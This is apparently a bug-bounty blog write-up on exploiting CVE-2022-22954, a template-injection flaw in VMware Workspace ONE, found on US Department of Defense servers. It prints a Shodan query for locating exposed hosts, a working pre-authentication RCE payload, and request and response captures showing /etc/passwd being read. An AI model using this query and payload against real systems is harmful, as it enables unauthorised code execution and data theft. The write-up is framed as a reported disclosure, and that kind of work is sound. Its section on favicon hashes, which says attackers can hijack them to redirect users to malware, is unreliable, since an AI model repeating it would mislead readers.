---
title: "Story of How I was able to find two RCEs in US dept of defense assets"
AuthorId: "3"
Date: "2022-05-23"
tags:
  - bugbounty, rce
---

Hello people, Here is an interesting writeup about the Server-side template injection which can be escalated to Remote code execution via **uuid** parameter in VMware workspace One and identity manager belongs to US dept of defense. 

This Vulnerability has been legally reported to **VMware** by **Steven Seeley** and the advisory has assigned **CVE-2022-22954**

### What’s the Server-side Template Injection Vulnerability ?

Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side. This vulnerability occurs when invalid user input is embedded into the template engine which can generally lead to remote code execution (RCE).

### CVE-2022-22954 Explained

This vulnerability allows remote attackers to execute arbitrary code on affected installations of VMware Workspace ONE Access. Authentication is not required to exploit this vulnerability. The specific flaw exists within the customError.ftl template.

The issue results from the usage of unsafe freemarker syntax, specifically a call to eval on untrusted input. An attacker can leverage this vulnerability to execute code in the context of the horizon user.

### How I Found this Vulnerability ?

On 11th April 2022 , Once my day job is done I have habit of going through twitter it’s just kind of Habit like every people does . While going through the twitter , I found Sherlock Secure Aka Udhaya Prakash where he released the proof of concept and details about the advisory **CVE-2022-22954** through his GitHub page 

[https://github.com/sherlocksecurity/VMware-CVE-2022-22954](https://github.com/sherlocksecurity/VMware-CVE-2022-22954)

So, We got everything we want like from **favicon hash to Proof of concept to exploit this vulnerability.** 

### You can ask what’s that Favicon hash value ?

A favicon can easily be accesses by taking the favicon.ico string on a website domain name. Take the BBC, for instance. Extract the domain name, so [BBC.co.uk](http://bbc.co.uk/), place the favicon.ico icon at the end of the domain name, so that you will have [bbc.co.uk/favicon.ico](http://bbc.co.uk/favicon.ico). Now, with this URL, you can place this into Google via an image engine to collect the relevant data.

This might appear to be an efficient trick. But this technique is a vulnerability issue that can be exploited by bad actors and hackers.

Attackers can hack into the favicon hash to redirect the path of a user. This way, a user may be clicking on the favicon with the intent of going to a specific site but may, in actuality, be directed to a bogus site abundant with malware. Once on this bogus site, the user may inadvertently download malicious code via phishing links, provide personal data/passwords/banks details, and more.

Let’s get into the topic, Once we got details about the vulnerability and POC to exploit 

- Now on **shodan** , I used the specific search query

**Shodan Query:**

```bash
http.favicon.hash:-1250474341
```

While going through the shodan result, I found that two servers belongs to **US Dept of Defense** vulnerable to **CVE-2022-22952** 

[![dod-shodan.png](https://i.postimg.cc/hj6g71q2/dod-shodan.png)](https://postimg.cc/ygm2M9xR)

### How I exploited this Vulnerability ?

- Open the Vulnerable server or the site that we got from the shodan result and Intercepted the request in Burpsuite

**Request:**

```bash
GET / HTTP/1.1
Host: █████████
Cookie: LOGIN_XSRF=NSlYKinVNwgOtuT; JSESSIONID=A86B60C5FD0B58346764D1FB01DAF155
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

- Append the Following endpoint **/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d**

**Payload Used:**

```bash
deviceUdid=${"freemarker.template.utility.Execute"?new()("bash -c {eval,$({echo,aWQ7dW5hbWUgLWE=}|{base64,-d})}")}
```

**Payload Explained**

- From the above payload , It executes a **id** command where we had encoded the value as base64
- Secondly , the response is quite interesting where we got vulnerability got triggered with the status code as 400
- Finally , Which logs several messages (with payload) and two call stacks to /opt/vmware/horizon/workspace/logs/greenbox_web.log. Exception is com.vmware.endusercatalog.auth.InvalidAuthContextException.
- Ironically makes the vulnerability as a PreAuth

**Response:**

```bash
HTTP/1.1 400 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: EUC_XSRF_TOKEN=6386e149-ff55-4a34-b474-30e6c0c62299; Path=/catalog-portal; Secure
Cache-Control: no-cache,private
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Frame-Options: SAMEORIGIN
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Mon, 11 Apr 2022 15:03:40 GMT
Connection: close
Content-Length: 3576

<!DOCTYPE HTML>
<html xmlns="http://www.w3.org/1999/html">
<head>
    <title>Error Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <style>
        body {
            background: #465361;
        }

        .error-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            text-align: center;
            width: 25%;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 3px 2px -2px rgba(0, 0, .5, 0.35);
            border-radius: 4px;
        }

        .error-img-container svg {
            width: 40px;
        }

        .error-text-heading {
            font-weight: bold;
            padding-top: 5px;
            padding-bottom: 10px;
        }

        .error-text-container a {
            text-decoration: none;
        }
    </style>
</head>

<body>
<div class="error-container">
    <div class="error-img-container">
        <svg id="icon-warning-big" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
            <path d="M28.48,24.65,17.64,5.88a1.46,1.46,0,0,0-1.28-.74h0a1.46,1.46,0,0,0-1.28.74L4.25,24.64a1.48,1.48,0,0,0,1.28,2.22H27.2a1.48,1.48,0,0,0,1.28-2.21Zm-1.07.86a.24.24,0,0,1-.21.12H5.53a.24.24,0,0,1-.21-.37L16.15,6.49a.24.24,0,0,1,.21-.12h0a.24.24,0,0,1,.21.12L27.41,25.26A.23.23,0,0,1,27.41,25.51Z"
                  fill="#991700" stroke-width="0"/>
            <circle cx="16.36" cy="13.53" r="0.92" fill="#f38b00" stroke-width="0"/>
            <path d="M16.36,16.43a.62.62,0,0,0-.62.62v5.55a.62.62,0,0,0,1.23,0V17A.62.62,0,0,0,16.36,16.43Z"
                  fill="#991700" stroke-width="0"/>
        </svg>
    </div>
    <div class="error-text-heading">Request Failed</div>
    <div class="error-text-container">
        <p>Please contact your IT Administrator.</p>
        <a href="/catalog-portal/ui/logout?error=&deviceUdid=$%7B%22freemarker.template.utility.Execute%22?new()(%22cat%20/etc/passwd%22)%7D">Sign Out</a>
    </div>
</div>
</body>
<script>
    if (console && console.log) {
        console.log("auth.context.invalid");
        console.log("Authorization context is not valid. Login request  received with tenant code: ███████, device id: root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/dev/null████████
    }
</script>
</html>
```

- As you can see , In the case I have encoded **cat+/etc/passwd** as a base64 and replaced it inside the above payload which I had already mentioned and the response got the contents of **/etc/passwd** with status code of 400

### Conclusion

The Vulnerability has been reported and got resolved 

### Hackerone Disclosed Reports:

- [https://hackerone.com/reports/1537543](https://hackerone.com/reports/1537543)
- [https://hackerone.com/reports/1537694](https://hackerone.com/reports/1537694)

Thanks for Reading my Writeup I hope you guys love it :-)

[![giphy.gif](https://i.postimg.cc/63mjWHNp/giphy.gif)](https://postimg.cc/R6wQGLFk)
